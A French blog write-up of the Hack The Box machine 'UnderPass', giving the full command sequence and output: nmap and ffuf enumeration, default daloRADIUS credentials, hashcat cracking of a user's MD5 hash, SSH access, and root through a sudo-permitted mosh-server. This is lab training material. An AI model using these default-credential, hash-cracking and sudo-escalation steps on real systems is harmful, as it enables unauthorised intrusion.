---
title: UnderPass - Linux Easy - HTB Writeup 
description:
slug: underpass-htb-writeup-linux-easy
date: 2025-05-10 00:00:00+0000
image: UnderPass.PNG
categories:
    - Hack
    - Linux
    - Easy
tags:
    - Sudo Privilege escalation

---
## Résumé
User: Identifiants par défaut + réutilisation d'un mot de passe faible\
Root: Sudo Privilege escalation

## Enumeration
A l'aide d'un scan nmap, nous pouvons identifier qu'un service SSH et web sont exposés.
{{< highlight go "hl_lines=1 4 8" >}}
$ nmap -Pn -p- 10.10.11.48 -A -v

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp    open     http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
7294/tcp  filtered unknown
12945/tcp filtered unknown
37517/tcp filtered unknown
39220/tcp filtered unknown
44459/tcp filtered unknown
55246/tcp filtered unknown
55628/tcp filtered unknown
64827/tcp filtered unknown
{{< /highlight >}}

## Utilisateur
### Fuzzing
En utilisant ```ffuf``` pour effectuer du fuzzing de répertoires sur le port 80, on découvre le chemin ```/daloradius/app/operators```.\
En accédant à ce chemin, nous sommes redirigés vers une page de connexion liée à ```Daloradius```, une ["plateforme RADIUS web avancée destinée à la gestion de hotspots et de déploiements SP génériques".](https://github.com/lirantal/daloradius)
{{< highlight go "hl_lines=1 5 9" >}}
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.48/FUZZ
daloradius              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 15ms]
<...>

$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.48/daloradius/FUZZ
app                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 15ms]
<...>

$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.48/daloradius/app/FUZZ
operators               [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 87ms]
<...>
{{< /highlight >}}
Chemin: http://10.10.11.48/daloradius/app/operators/login.php
![](Path.PNG)

### Identifiants par défaut
En utilisant les identifiants par défaut ```administrator:radius```, facilement trouvables sur internet, on accède à la page d'accueil de Daloradius.\
Depuis cette interface, nous pouvons accéder à la page ```users``` et utiliser hashcat pour trouver le mot de passe de ```svcMosh``` qui s'apparente à un hash MD5.
![](mng-list-all.PNG)
{{< highlight go "hl_lines=1 3 5" >}}
$ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
<...>
412dd4759978acfcc81deab01b382403:underwaterfriends
<...>
{{< /highlight >}}

Grâce à ces identifiants, on accède au serveur en tant qu'utilisateur svcMosh.
{{< highlight go "hl_lines=1" >}}
$ ssh svcMosh@10.10.11.48
<...>
svcMosh@underpass:~$ pwd
/home/svcMosh
svcMosh@underpass:~$ ls
user.txt
{{< /highlight >}}

## Root
### Sudo Privilege escalation

L'utilisateur ```svcMosh``` est autorisé à éxécuté ```mosh-server``` via sudo, [un composant de Mosh,  shell distant conçu pour des sessions interactives similaires à SSH.](https://mosh.org/)\
Comme cette commande peut être exécutée via sudo, nous pouvons l’utiliser pour obtenir un shell avec les privilèges root.
{{< highlight go "hl_lines=1 7 9 13 15 17" >}}
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

svcMosh@underpass:~$ sudo /usr/bin/mosh-server
MOSH CONNECT 60002 zl0g6Tbx/KIgOR0jzdQ9wA
<...>

svcMosh@underpass:~$ MOSH_KEY=zl0g6Tbx/KIgOR0jzdQ9wA mosh-client 127.0.0.1 60002

root@underpass:~# pwd
/root
root@underpass:~# ls
root.txt
{{< /highlight >}}